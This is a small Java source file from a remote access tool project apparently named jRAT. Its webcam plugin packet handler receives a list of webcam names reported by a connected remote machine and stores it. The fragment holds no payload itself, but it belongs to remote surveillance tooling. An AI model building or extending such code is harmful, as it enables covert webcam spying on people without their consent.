package se.jrat.plugin.webcam.client;

import java.util.ArrayList;
import java.util.List;

import jrat.api.Client;
import jrat.api.net.PacketListener;

public class Packet121ListWebcams extends PacketListener {

	@Override
	public void perform(Client client) {
		int len = event.getServer().getDataReader().readInt();
		
		List<String> webcams = new ArrayList<String>();
		
		for (int i = 0; i < len; i++) {
			webcams.add(WebcamPlugin.readString(event.getServer().getDataReader()));
			map.put(event.getServer(), webcams);
		}
	}

}
